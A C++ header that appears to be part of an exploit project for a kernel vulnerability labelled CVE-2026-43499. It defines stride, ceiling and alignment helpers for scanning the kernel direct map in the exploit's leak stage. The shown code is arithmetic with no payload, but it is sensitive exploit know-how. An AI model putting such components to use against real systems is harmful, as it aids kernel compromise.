#pragma once
/** @file backend/cve_2026_43499/leak/scan_geometry.hpp
 *  The shape of the leak scan: three strides, a ceiling, and an aligned range.
 *
 *  The retired search walked the direct map in three nested strides -- a coarse one
 *  over gigabytes, a slab one, and the size of the object it was looking for -- and
 *  every inner bound was the outer bound clamped by scan_limit. It also aligned the
 *  range it was given: the start down to a coarse boundary, and the end up to one,
 *  but only when it was not already there.
 *
 *  All four quantities are inputs. The strides come from the profile and from the
 *  page size, and the two ends of the ceiling come from the kernel: one is measured
 *  and the other belongs to the kernel build, which is the same reason the object
 *  size does. Nothing here owns a number, and nothing here walks anything -- the
 *  walk is the orchestration business.
 */
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43499::leak {
    /** How far the three nested walks step. */
    struct ScanStrides final {
        /** The coarsest stride: the range is aligned to this. */
        std::uint64_t coarse = 0U;
        /** The stride of the second walk, derived from the page size and an order. */
        std::uint64_t slab = 0U;
        /** The size of the object being looked for. */
        std::uint64_t candidate = 0U;
    };

    /** A range to walk, aligned to the coarse stride. */
    struct ScanRange final {
        std::uint64_t start = 0U;
        std::uint64_t end = 0U;
    };

    /** Why a scan shape cannot be used. Names follow the single table. */
    enum class ScanGeometryVerdict : unsigned char { Ok = 0, GeometryMissing = 1 };

    [[nodiscard]] constexpr const char *scan_geometry_verdict_name(
        ScanGeometryVerdict verdict) noexcept {
        return verdict == ScanGeometryVerdict::Ok ? "ok" : "geometry-missing";
    }

    /** True when every stride is usable: a walk that steps by zero never advances. */
    [[nodiscard]] constexpr bool strides_are_usable(const ScanStrides &strides) noexcept {
        return strides.coarse != 0U && strides.slab != 0U && strides.candidate != 0U;
    }

    /** Where the scan stops: the lower of the measured end of the direct map and the
     *  end of the identity range for this kernel build. A zero on either side means
     *  nobody measured it, and a scan with no ceiling is one that runs off the map. */
    [[nodiscard]] constexpr ScanGeometryVerdict scan_ceiling(std::uint64_t direct_map_end,
                                                             std::uint64_t identity_end,
                                                             std::uint64_t &out) noexcept {
        if (direct_map_end == 0U || identity_end == 0U) {
            return ScanGeometryVerdict::GeometryMissing;
        }
        out = direct_map_end < identity_end ? direct_map_end : identity_end;
        return ScanGeometryVerdict::Ok;
    }

    /** Align a range to the coarse stride: the start down, the end up and only when
     *  it is not already there. The retired tree did exactly this, and the difference
     *  between rounding up and leaving alone is one coarse stride of scanning. A
     *  rounding that would wrap is refused rather than allowed to produce a smaller
     *  end than it started with, which would stop the scan early in silence. */
    [[nodiscard]] constexpr ScanGeometryVerdict align_scan_range(const ScanRange &range,
                                                                 std::uint64_t coarse,
                                                                 ScanRange &out) noexcept {
        if (coarse == 0U || (coarse & (coarse - 1U)) != 0U) {
            return ScanGeometryVerdict::GeometryMissing;
        }
        const std::uint64_t mask = ~(coarse - 1U);
        std::uint64_t end = range.end;
        if ((end % coarse) != 0U) {
            const std::uint64_t rounded = end & mask;
            if (rounded > (UINT64_MAX - coarse)) {
                return ScanGeometryVerdict::GeometryMissing;
            }
            end = rounded + coarse;
        }
        out.start = range.start & mask;
        out.end = end;
        return ScanGeometryVerdict::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
